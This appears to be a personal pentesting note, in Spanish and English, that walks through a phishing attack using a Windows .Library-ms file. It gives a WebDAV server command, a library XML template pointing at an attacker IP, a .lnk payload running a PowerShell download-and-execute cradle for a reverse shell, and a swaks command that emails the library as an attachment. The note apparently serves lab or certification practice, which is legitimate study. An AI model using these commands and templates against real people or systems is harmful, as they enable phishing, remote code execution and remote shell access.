
## DESCRIPTION

Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a **.Library-ms** file extension and can be executed by double-clicking them in Windows Explorer.

Entonces si podemos enviarlo a un usuario y este hace click, entonces se conectarán a nuestro servidor y descargara y ejecutará lo que allí haya. IMPORTANTE: necesitamos *WebDAV*.

#### Mas información
* https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/the-content-library


## EXPLOITATION

Path attack for this example:  jim open te attach library -> the library call your webdav -> download and execute your .lnk with your payload

1.  LEVANTAR NUESTRO SERVIDOR WEBDAV: para realizar esta tarea utlizaremos la herramienta wsgidav: https://wsgidav.readthedocs.io/en/latest/

```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

**!!NOTA IMPORTANTE!!** En la carpeta /web/dav/ debemos de meter nuestro payload, en este caso nuesto .lnk

![[Pasted image 20230427134358.png]]

2.  CREAMOS LIBRERÍA DE WINDOWS: Tenemos que crear nuestra librería de Windows, se puede usar Visual Studio. Pero en nuestro caso hemos usado esta plantilla:

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.166</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

![[Pasted image 20230427134554.png]]

Esta librería descarga lo que hay en esa IP (Servidor WebDAV), no funciona un servidor Web normal. (nombre config.Library-ms )

3. PAYLOAD: Creamos nuestro payload como acceso directo .lnk.

El payload de ejemplo que se va a inyectar es:

```
#Por ejemplo
cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.10:8080/Invoke-PowerShellTcp.ps1')"
```

Accedemos a la máquina Windows, click derecho y nuevo acceso directo:

![[Pasted image 20230427181325.png]]


![[Pasted image 20230427135217.png]]

3. Movemos nuestro payload .lnk a la ruta de WebDav, en este caso a `/home/kali/webdav/`

4. Preparamos nuestro Invoke-PowerShellTcp.ps1 [[POWERSHELL REVERSESHELL]]

5. Nos ponemos a la escucha

6. Enviamos nuestro PHISHING por SMS: utilizamos la herramienta swaks, y adjuntamos nuestra librería.

```
# Ejemplo
swaks --to jim@relia.com --from maildmz@relia.com --header "Subject: file you asked for? http://192.168.119.166:4455" --body "Here you go" --server 192.168.166.189 --attach @config.Library-ms --suppress-data -ap

```


## MACHINES

* Hack The Box: 


